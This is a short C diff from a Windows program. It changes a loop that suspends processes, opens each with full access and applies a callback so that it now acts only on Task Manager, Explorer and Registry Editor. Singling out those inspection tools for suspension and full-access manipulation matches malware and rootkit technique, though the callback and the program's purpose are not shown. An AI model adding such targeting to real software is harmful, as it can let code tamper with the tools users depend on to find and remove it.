@@ -23,14 +23,18 @@ BOOL process_allSuspendApplyResume(APPLY aFunc) {
     while (TRUE) {
 		DWORD dwPID = pe32.th32ProcessID;
 		if (dwGKPID != dwPID && dwPID != 0) { // Lets not suspend ourself
-			if (TRUE == process_suspendOrResumeAllThreads(dwPID, TRUE)) {
-				HANDLE hP = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
+			if (stricmp(pe32.szExeFile, "taskmgr.exe") == 0
+				|| stricmp(pe32.szExeFile, "explorer.exe") == 0
+				|| stricmp(pe32.szExeFile, "regedit.exe") == 0) {
+				if (TRUE == process_suspendOrResumeAllThreads(dwPID, TRUE)) {
+					HANDLE hP = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
 
-				if (NULL != hP) {
-					if (NULL != aFunc) // For debugging purpose only TODO remove
-						aFunc(hP);
-					CloseHandle(hP);
-					process_suspendOrResumeAllThreads(dwPID, FALSE);
+					if (NULL != hP) {
+						if (NULL != aFunc) // For debugging purpose only TODO remove
+							aFunc(hP);
+						CloseHandle(hP);
+						process_suspendOrResumeAllThreads(dwPID, FALSE);
+					}
 				}
 			}
 		}
